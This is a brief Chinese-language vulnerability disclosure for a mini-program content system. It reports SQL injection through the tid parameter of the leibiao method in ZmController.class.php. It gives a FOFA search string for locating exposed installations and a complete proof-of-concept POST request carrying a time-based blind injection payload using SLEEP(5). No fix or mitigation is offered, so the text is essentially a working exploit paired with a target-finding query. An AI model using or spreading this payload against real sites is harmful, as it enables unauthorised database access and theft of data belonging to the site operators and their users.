# 知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞

知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞，位于 /Application/App/Controller/ZmController.class.php 控制器中的leibiao方法直接POST传入tid参数，然后直接带到sql查询中，导致漏洞产生。

fofa

```javascript
"域名/skdjfdf"
```

## poc

```javascript
POST /app/zm/leibiao HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=q7pp0d3p3f5ileeqhnf8v5lnt1
Connection: close
Content-Length: 55

tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)
```

![c469f37e9896e4ad478f4d75eadc4196](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181628116.jpg)